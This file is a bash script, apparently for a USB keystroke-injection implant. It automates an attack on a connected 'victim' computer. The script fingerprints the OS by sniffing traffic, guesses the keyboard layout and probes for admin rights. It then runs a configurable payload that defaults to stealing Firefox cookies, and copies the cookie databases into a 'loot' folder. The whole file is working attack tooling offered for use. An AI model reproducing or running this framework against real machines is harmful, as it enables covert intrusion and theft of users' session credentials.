#!/bin/bash

################################################################################
# configure detection (OS, layout and root) and payload
################################################################################

# WLAN AP geofencing
# set to 1 is active, 0 is deactivated
# set the allowed / denied devices in the wlanFencing function
doWlanFencing=0

# OS detection
# if the string is empty then script will try to determine the OS
# if an OS ("Windows", "Linux" or "Mac") is set the detection will be skipped
# and the set element value will be used
os=""

# Layout detection
# keyboard layouts that should be tried
# testing order is from left to right
# if the array only contains one element the detection will be skipped
# and the set element value will be used
# if no value is set the default value ("us") will be used
langs=( de us fr )
# if the OS is Window (detected or the variable is set by the user)
# the framework can use alt codes to force the host the use the 'us' layout
# instead of trying to detect the used keyboard layout
# set to 1 is active, 0 is deactivated
# layouts in the langs array will be ignored in this case
winForceUS=0

# Root / admin detection
# check if higher rights can be get
# set to 1 is active, 0 is deactivated
rootCheck=1


# Payload
# if a custom DUCKY SCRIPT file should be used then set the variable
# to the path of the file, e.g. "/root/udisk/library/stealCookies.sh"
# compatible DUCKY SCRIPT files should be placed in "/root/udisk/library/"
# "/root/udisk/library/template.sh" can be used as a template
# just adjust the QUACK calls in the OS functions
# if a binary should be executed then set the variable to "/root/udisk/library/payload-execute.sh"
# binaries named "win.exe", "lin" and "mac" should be placed in "/root/binaries/"
payload="/root/udisk/library/payload-execute.sh"
#payload="/root/udisk/library/stealFirefoxCookies.sh"
# for binaries optional command line arguments can be passed by setting cmdArgs
# if not needed, set it to an empty string
cmdArgs="cookies"
# file that is created by the DUCKY SCRIPT or binary to detect if the execution is finished
# needed if the type time != execution time
# e.g. when copying large files
# if not needed then set it to an empty string
# the framework will go on will not wait for any created files
doneFile="done.txt"
# maxTries = max seconds to wait for completion of a given payload
# if a payload takes longer than the specified seconds then the execution will be stopped
maxTries=15
# is root/ admin needed for the payload execution?
# if set to 1 the script uses "sudo" as prefix or a "run as admin"-started terminal
# if a root check has been done before, root is not available but needed the execution will be stopped
needRoot=0
# cp wildcard to extract files from the mass storage, comment out or set to empty string if not used
# files will be copied to the "loot" location ("/root/udisk/loot")
extractFiles="cookies[0-9]*.sqlite"

################################################################################

# DANGER ZONE
# almost never needed to edit these variables
# only change if you know what you're doing!

# paths (keep in sync with image-helper.sh!)
imagePath=/root/ums
mountPath=/media

# global vars
# just for function access - do not edit
rootAvailable=0

################################################################################

function cleanStop() {
    echo "$(date +"%T") : cleanup - resetting mass storage" >> /root/udisk/keyos-log.txt
    ATTACKMODE OFF
    echo "$(date +"%T") : cleanup - resetting $drive" >> /root/udisk/keyos-log.txt
    /root/scripts/image-helper.sh prepare $imagePath/$drive 2>>/root/udisk/keyos-log.txt
    echo "$(date +"%T") : cleanup - done" >> /root/udisk/keyos-log.txt
}

function wlanFencing() {
    echo "$(date +"%T") : WLAN AP geofencing ..." >> /root/udisk/keyos-log.txt
    sleep 2
    # adjust to your needs
    # for detailed inforation about the cli syntax check the wlanFencing.py file
    /root/scripts/wlanFencing.py -a "<SSID>"
    if [ "$?" -eq "0" ]
    then
        echo "$(date +"%T") : WLAN AP geofencing - conditions met" >> /root/udisk/keyos-log.txt
    else
        echo "$(date +"%T") : WLAN AP geofencing failed - stopping" >> /root/udisk/keyos-log.txt
        LED FAIL
        exit 1
    fi
}

function detectOS() {

    function readFifo() {

        pipe=/root/bashrecv

        while true
        do
            if read line <$pipe
            then

                echo $line

                if [[ "$line" == "os"* ]]
                then
                    tmpOS=${line:3}
                    break
                fi

            fi
        done

        rm -f $pipe

        case $tmpOS in

            "Windows" | "Linux" | "Mac" | "Unknown")
                #echo "$(date +"%T") : OS is Windows, Linux, Mac or Unknown" >> /root/udisk/keyos-log.txt
                os=$tmpOS
                ;;

            *)
                #echo "$(date +"%T") : no OS found" >> /root/udisk/keyos-log.txt
                ;;
        esac
    }

    pipe_py=/root/pyrecv
    if [[ ! -p $pipe_py ]]
    then
        mkfifo $pipe_py
    fi

    /root/scripts/analyze-pcap.py 2>>/root/udisk/keyos-log.txt &
    ATTACKMODE RNDIS_ETHERNET

    echo "$(date +"%T") : sniffing ..." >> /root/udisk/keyos-log.txt
    readFifo

    # check if the OS could be identified
    if [[ ! -z $os ]]
    then
        echo "$(date +"%T") : analyzing successful" >> /root/udisk/keyos-log.txt
        echo -n "stop" > /root/pyrecv
    else
        echo "$(date +"%T") : no packets found - retrying sniffing ..." >> /root/udisk/keyos-log.txt
        ATTACKMODE ECM_ETHERNET
        readFifo

        if [[ ! -z $os ]]
        then
            echo "$(date +"%T") : analyzing successful" >> /root/udisk/keyos-log.txt
            echo -n "stop" > /root/pyrecv
        else
            echo "$(date +"%T") : second analyzing try failed - stopping" >> /root/udisk/keyos-log.txt
            echo -n "stop" > /root/pyrecv
            # storage is untouched --> exit is enough
            LED FAIL
            exit 1
        fi

    fi


    if echo $os | grep -q "Unknown"
    then
        echo "$(date +"%T") : could not detect the OS - stopping" >> /root/udisk/keyos-log.txt
        # storage is untouched --> exit is enough
        LED FAIL
        exit 1
    else
        echo "$(date +"%T") : detected OS: $os" >> /root/udisk/keyos-log.txt
    fi
}

function mountDrive() {
    # adjust the drive so rwx does work ootb on all OS
    if [ $os = "Linux" ]
    then
        drive="ntfs.bin"
    else
        drive="fat32.bin"
    fi

    # mount the correct drive depending on the OS
    echo "$(date +"%T") : mounting drive: $drive" >> /root/udisk/keyos-log.txt
    sed -i -r "s# file=[^[:space:]]+# file=$imagePath/$drive#g" /usr/local/croc/bin/ATTACKMODE
    ATTACKMODE HID STORAGE
    # reset device for mass storage (otherwise accessing the payload dir does not work anymore with a pin)
    sed -i -r "s# file=[^[:space:]]+# file=/dev/nandf#g" /usr/local/croc/bin/ATTACKMODE

    # explorer spawns for the mounted drive
    # on Ubuntu it can happen that the first keyboard detection iteration gets skipped
    # a bit hacky because we do not exactly know, when the windows drive pop-up appears...
    if [ $os = "Windows" ]
    then
        sleep 5
    else
        sleep 3
    fi
}


function detectLayout() {
    for lang in "${langs[@]}"
    do
        export DUCKY_LANG=$lang
        echo "$(date +"%T") : trying language $DUCKY_LANG ..." >> /root/udisk/keyos-log.txt
        /root/udisk/library/keyboard.sh $os
        mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt

        #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
        if [ -f $mountPath/language.txt ]
        then
            echo "$(date +"%T") : keyboard language is $DUCKY_LANG" >> /root/udisk/keyos-log.txt
            umount $mountPath
            break
        fi

        umount $mountPath
        # last language try and no success --> abort
        if [[ "$lang" == "${langs[-1]}" ]]
        then
            echo "$(date +"%T") : unknown keyboard language - stopping" >> /root/udisk/keyos-log.txt
            cleanStop
            LED FAIL
            exit 1
        fi
    done
}


function checkRoot() {
    echo "$(date +"%T") : root check enabled" >> /root/udisk/keyos-log.txt
    # run root-check
    /root/udisk/library/root-check.sh $os
    mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
    #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
    if [ -f $mountPath/root.txt ]
    then
        echo "$(date +"%T") : root available" >> /root/udisk/keyos-log.txt
        rootAvailable=1
    else
        echo "$(date +"%T") : root not available" >> /root/udisk/keyos-log.txt
        rootAvailable=0
    fi
    umount $mountPath
}

function executePayload() {

    # set cmd arguments (only for executable payload)
    if [ $payload = "/root/udisk/library/payload-execute.sh" ]
    then
        sed -i "s/cmdArgs='.*'/cmdArgs='$cmdArgs'/" $payload
    fi

    # if we've checked root and do not have root then stop (because it will defintely not work)
    if [ -v rootAvailable ]
    then
        if [ $rootAvailable -eq 0 ] && [ $needRoot -eq 1 ]
        then
            echo "$(date +"%T") : stopping - reason: root not available" >> /root/udisk/keyos-log.txt
            cleanStop
            LED FAIL
            exit 1
        fi
    fi

    # execute DUCKYSCRIPT payload
    # if root needed then use "sudo"-prefix or a "run as admin"-started terminal
    # for the payload bin execution file
    $payload $os $needRoot

    # if done file is set wait until the file has appeared / maxTries is reached
    if [ ! -z $doneFile ]
    then
        mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
        #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
        ls $mountPath | grep -q $doneFile
        foundFile=$?
        umount $mountPath

        # check continuous if the payload is done
        iterations=0
        until [ "$foundFile" -eq "0" ]
        do
            echo "$(date +"%T") : waiting for payload feedback - iteration $iterations" >> /root/udisk/keyos-log.txt
            mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
            #ls -lah $mountPath >> /root/udisk/keyos-log.txt # DEBUG
            ls $mountPath | grep -q $doneFile
            foundFile=$?
            umount $mountPath

            # check if we have already waited more than wanted (default 15 seconds)
            # if so: stop and clean up (sth probably did not work)
            if (( iterations > maxTries ))
            then
                echo "$(date +"%T") : stopping - reason: waited more than $maxTries seconds for feedback" >> /root/udisk/keyos-log.txt
                cleanStop
                LED FAIL
                exit 1
            fi

            sleep 1
            ((iterations=iterations+1))
        done
    fi

    echo "$(date +"%T") : payload execution is done" >> /root/udisk/keyos-log.txt
}

function saveFiles() {
    mount -r -o loop $imagePath/$drive $mountPath 2>>/root/udisk/keyos-log.txt
    newFolderName=$(date +%Y-%m-%d_%H%M%S)
    mkdir /root/udisk/loot/$newFolderName
    cp $mountPath/$extractFiles /root/udisk/loot/$newFolderName 2>>/root/udisk/keyos-log.txt
    umount $mountPath
}


################################################################################
# main
################################################################################

ATTACKMODE OFF
LED ATTACK
cat /dev/null > /root/udisk/keyos-log.txt
echo "$(date +"%T") : start" >> /root/udisk/keyos-log.txt

# WLAN AP geofencing
# wait until WLAN APs are in range / out of range
if [ $doWlanFencing -eq 1 ]
then
    wlanFencing
fi

# OS detection
# try to detect the OS if an OS is not set
if [[ -z $os ]]
then
    detectOS
fi

# mount the UMS (mass storage) on the host (victim) and on the croc
mountDrive

# layout detection
# use altcode mode if activated and OS is Windows (detected or set)
if [ $winForceUS -eq 1 ] && [ $os = "Windows" ]
then
    echo "$(date +"%T") : altcode mode - will force to use the 'us' layout" >> /root/udisk/keyos-log.txt
    /root/udisk/library/keyboard-altcode.sh $os
else
    # take a look at the langs array
    # detection method only enabled if more than one language is set
    # otherwise use set single language or the Key Croc default ("us")
    if [ ${#langs[@]} -eq 1 ]
    then
        echo "$(date +"%T") : single layout set to ${langs[0]}" >> /root/udisk/keyos-log.txt
        export DUCKY_LANG=${langs[0]}
    elif [ ${#langs[@]} -gt 1 ]
    then
        echo "$(date +"%T") : layout detection ..." >> /root/udisk/keyos-log.txt
        detectLayout
    else
        echo "$(date +"%T") : no layout set, using default" >> /root/udisk/keyos-log.txt
    fi
fi

# root check
if [ $rootCheck -eq 1 ]
then
    checkRoot
fi

# payload execution
echo "$(date +"%T") : executing payload" >> /root/udisk/keyos-log.txt
executePayload

# file saving
if ! test -z "$extractFiles"
then
    # try to backup copied places data (from victim) if there are any
    # in a newly created folder (y-m-d_hms)
    echo "$(date +"%T") : extracting files from mass storage" >> /root/udisk/keyos-log.txt
    saveFiles
    cleanStop
else
    cleanStop
fi

echo "$(date +"%T") : execution and clearing done" >> /root/udisk/keyos-log.txt
LED FINISH
